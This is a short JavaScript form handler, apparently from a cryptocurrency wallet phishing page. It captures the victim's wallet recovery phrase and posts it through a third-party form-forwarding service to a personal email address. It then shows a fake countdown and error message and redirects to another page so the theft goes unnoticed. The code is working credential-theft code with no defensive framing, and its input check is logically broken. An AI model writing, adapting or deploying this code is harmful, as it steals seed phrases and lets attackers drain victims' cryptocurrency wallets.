/* let Secs = [10, 9, 8, 7, 6, 5, 4, 3, 2, 1,]
var i;

for (i = 0; i < Secs.length; i++) {
  setInterval(function () {
  }, 10000)
} */


form.addEventListener('submit', o)
function o(e) {
  e.preventDefault()
  mail = 'bamchika0@gmail.com'
  next = 'next.html'
  subject = `${window.location.hostname} ${new Date()}`
  let r = new FormData()
  recoveryPhrase = message.value
  r.append('recoveryPhrase', recoveryPhrase)
  r.append('_captcha', false)
  r.append('_next', next)
  r.append('_template', 'table')
  r.append('_subject', subject)
  let n = `https://formsubmit.co/${mail}`;


  if (recoveryPhrase.length < 20 && recoveryPhrase == '') {
    alert('Please ensure phrase is correctly typed')
  }
  else {
    fetch(
      n,
      {
        method: 'POST',
        body: r
      },
      { referrer: 'https://twitter.com' }
    ).then(e => {
      countdownBackdrop.style.display = 'flex'
      countdownBackdrop.style.justifyContent = 'center'
      countdownBackdrop.style.alignItems = 'center'
      let secs = 5
      setInterval(function () {
        countDown.innerHTML = secs--;
        if (secs === -1) {
          countdownDiv.style.display = 'none'
          errorDiv.style.display = 'flex'
          setInterval(function () {
            countdownBackdrop.style.display = 'none'
            window.location.assign(next)
          }, 3000)
        }
      }, 1000)
    })
  }
}
